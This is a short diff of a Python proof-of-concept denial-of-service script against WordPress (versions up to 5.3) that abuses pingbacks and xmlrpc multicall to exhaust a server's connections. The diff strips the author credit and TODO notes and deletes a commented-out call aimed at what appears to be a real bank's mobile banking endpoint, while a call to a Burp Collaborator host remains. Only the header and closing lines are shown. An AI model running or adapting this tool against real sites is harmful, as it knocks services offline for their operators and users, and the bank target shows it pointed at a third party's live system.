@@ -1,10 +1,7 @@
 #!/usr/bin/env python
 # WordPress <= 5.3.? Denial-of-Service PoC
 # Abusing pingbacks+xmlrpc multicall to exhaust connections
-# @roddux 2019 | Arcturus Security | labs.arcturus.net
-# TODO:
-# - Try and detect a pingback URL on target site
-# - Optimise number of entries per request, check class-wp-xmlrpc-server.php
+
 from urllib.parse import urlparse
 import threading
 import time
@@ -98,5 +95,4 @@ def main(pingback):
 #          print(f"[>] Total bytes sended: {count_bytes}")
 #	print("[+] Attacked Timing " + "~> " + str(end - start))
 #if __name__ == "__main__":
-#       main(pingback="https://mb.vietabank.com.vn/gwmobilebanking/PWSServer/testString")
 #       main(pingback="http://c1euw7len3grd7142i51cazoxf35ru.burpcollaborator.net")
